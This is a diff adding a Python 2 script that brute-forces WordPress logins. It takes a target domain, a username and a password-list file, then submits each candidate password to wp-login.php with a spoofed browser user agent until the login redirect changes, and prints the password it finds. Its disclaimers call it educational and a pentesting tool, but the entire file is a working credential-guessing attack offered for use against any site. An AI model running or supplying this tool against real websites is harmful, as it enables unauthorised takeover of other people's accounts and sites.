@@ -1,0 +1,117 @@
+#!usr/bin/python
+#This program is for educational purposes only.
+#Don't attack people's websites it's illegal ! 
+#If you want to crack into someone's website, you must have the permission of the owner. 
+#Abhishek Sharma(@Mkuchbhi) is not responsible.
+  
+  
+import sys
+import random
+import mechanize
+import cookielib
+import time
+  
+  
+GHT = '''
+        	+=======================================+
+        	|.......Brute wordpress Cracker.........|
+        	+---------------------------------------+
+        	|#Coder: Abhishek Sharma	        |
+        	|#github: @Mkuchbhi		        |
+        	|#Date: 21/12/2017                      |
+        	|#This tool is made for pentesting      |
+        	|#I take no responsibilities for the    |
+        	|  use of this program !                |
+        	+=======================================+
+        	|.......Brute wordpress Cracker.........|
+        	+---------------------------------------+
+'''
+print "WARNING - DON'T DO ANY ILLEGAL WORK. You will be RESPONSIBLE for your own actions"
+print "# Hit CTRL+C to quit the tool anytime"
+print "# Happy Bruteforcing"
+  
+url =  str(raw_input("# Enter Domain(including http(s)://) of Wordpress Site     : "))
+uname = str(raw_input("# Enter Username  : "))
+passl = str(raw_input("Enter the name of the password list file : "))
+  
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+  
+  
+  
+login = url+'/wp-login.php'
+def attack(password):
+  
+  try:
+     sys.stdout.write("\r ## Checking With %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form('loginform')
+  
+        
+     ##wordpress
+     br.form["log"] =uname
+     br.form["pwd"] =password
+     br.submit()
+     log = br.geturl()
+     if log != login:
+        print "\n\n\n ## gotcha! got password .. !!"
+        print "\n ## Here is Your Password : %s\n" % (password)
+        sys.exit(1)
+  except KeyboardInterrupt:
+        print "\n## Closing Tool .. "
+        sys.exit(1)
+  
+def search():
+    global password
+    for password in passwords:
+        attack(password.replace("\n",""))
+  
+  
+  
+def check():
+  
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n## Closing Tool ..\n"
+       sys.exit(1)
+    try:
+       list = open(passl, "r")
+       passwords = list.readlines()
+       k = 0
+       while k < len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n ## Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n ## Closing Tool ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " ## Cracking UserName : %s" % (uname)
+        print " ## password list has" , len(passwords), "passwords"
+        print " ## Bruteforcing, please wait ..."
+    except KeyboardInterrupt:
+        print "\n ## Closing Tool ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n ## Closing Tool ..\n"
+        sys.exit(1)
+  
+if __name__ == '__main__':
+    check()
